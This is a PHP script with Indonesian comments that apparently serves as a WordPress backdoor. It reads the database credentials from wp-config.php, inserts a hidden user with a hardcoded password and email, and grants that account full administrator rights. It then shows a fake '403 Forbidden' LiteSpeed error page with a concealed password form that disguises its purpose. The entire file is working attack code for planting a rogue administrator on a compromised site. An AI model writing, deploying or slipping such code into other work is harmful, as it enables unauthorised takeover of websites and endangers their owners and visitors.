<?php
// Path ke file wp-config.php Anda
// Mendapatkan dokumen root (root directory) dari situs web Anda
$document_root = $_SERVER['DOCUMENT_ROOT'];

// Path ke file wp-config.php Anda
$wp_config_path = $document_root . '/wp-config.php';

// Variabel untuk data pengguna
$user = 'kores'; // Ganti dengan nama pengguna yang Anda inginkan
$user_password = 'asd123@'; // Ganti dengan kata sandi yang Anda inginkan
$email = 'febrianwirahadi8652@gmail.com'; // Ganti dengan alamat email yang Anda inginkan

// Periksa apakah file wp-config.php ada
if (file_exists($wp_config_path)) {
    // Sertakan file wp-config.php
    require_once($wp_config_path);

    // Sekarang Anda dapat mengakses informasi koneksi database
    $localhost = DB_HOST;
    $database = DB_NAME;
    $username = DB_USER;
    $password = DB_PASSWORD;
    $prefix = $table_prefix;

    // Buat koneksi ke database MySQL
    $conn = @mysqli_connect($localhost, $username, $password, $database) or die(mysqli_error($conn));

    // Pernyataan SQL untuk memasukkan data ke dalam tabel wp_users
    $sqlInsertUser = "INSERT INTO {$prefix}users (user_login, user_pass, user_email, user_status, user_registered, user_nicename) VALUES ('$user', MD5('$user_password'), '$email', '0', '2022-09-09 05:42:56', 'Hanz Kalaznikov')";

    // Jalankan pernyataan SQL untuk memasukkan data ke dalam tabel wp_users
    $insertUserResult = @mysqli_query($conn, $sqlInsertUser) or die(mysqli_error($conn));

    // Periksa jika pengguna berhasil dimasukkan
    if ($insertUserResult) {
        echo '<!DOCTYPE html>
<html style="height:100%">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
<title> 403 Forbidden
</title></head>
<body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
<div style="height:auto; min-height:100%; ">     <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
        <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1>
<h2 style="margin-top:20px;font-size: 30px;">Forbidden
</h2>
<p>Access to this resource on the server is denied!</p><style>input{margin:0;background-color:#fff;border:1px solid #fff}</style><pre align="center"><form method="post"><input name="pass"type="password"></form></pre></body></html>
</div></div><div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">
<br>Proudly powered by  <a style="color:#fff;" href="http://www.litespeedtech.com/error-page">LiteSpeed Web Server</a><p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p></div></body></html>';

        // Dapatkan ID pengguna yang dimasukkan
        $userId = mysqli_insert_id($conn);

        // Pernyataan SQL untuk memasukkan data ke dalam tabel wp_usermeta
        $sqlInsertUsermeta1 = "INSERT INTO {$prefix}usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, $userId, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')";
        $sqlInsertUsermeta2 = "INSERT INTO {$prefix}usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, $userId, '{$prefix}user_level', '10')";

        // Jalankan pernyataan SQL untuk memasukkan data ke dalam tabel wp_usermeta
        $insertUsermetaResult1 = @mysqli_query($conn, $sqlInsertUsermeta1) or die(mysqli_error($conn));
        $insertUsermetaResult2 = @mysqli_query($conn, $sqlInsertUsermeta2) or die(mysqli_error($conn));

        if ($insertUsermetaResult1 && $insertUsermetaResult2) {
            
        } else {
            echo 'Error saat memasukkan data tambahan ke dalam tabel wp_usermeta.';
        }
    } else {
        echo 'Error saat memasukkan data ke dalam tabel wp_users.';
    }

    // Tutup koneksi database
    mysqli_close($conn);
} else {
    echo 'File wp-config.php tidak ditemukan.';
}
?>
